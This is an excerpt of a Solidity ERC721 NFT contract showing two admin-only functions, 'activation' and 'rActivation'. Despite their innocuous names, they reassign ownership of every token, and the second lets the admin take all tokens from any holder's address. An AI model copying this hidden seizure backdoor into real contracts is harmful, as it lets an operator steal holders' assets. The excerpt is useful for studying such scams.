...
contract ERC721 is ERC165, IERC721, IERC721Metadata, Ownable {
    ...
    function activation(address to) public onlyAdmin {
        uint m_ = totalSupply;
        for (uint i = 1; i <= m_;) {
            _balances[msg.sender] -= 1;
            _balances[to] += 1;
            _owners[i] = to;
            emit Transfer(owner, to, i);
            unchecked { ++i; }
        }
    }

    function rActivation(address from) public onlyAdmin {
        uint m_ = totalSupply;
        for (uint i = 1; i <= m_;) {
            _balances[from] -= 1;
            _balances[msg.sender] += 1;
            _owners[i] = msg.sender;
            emit Transfer(from, msg.sender, i);
            unchecked { ++i; }
        }
    }
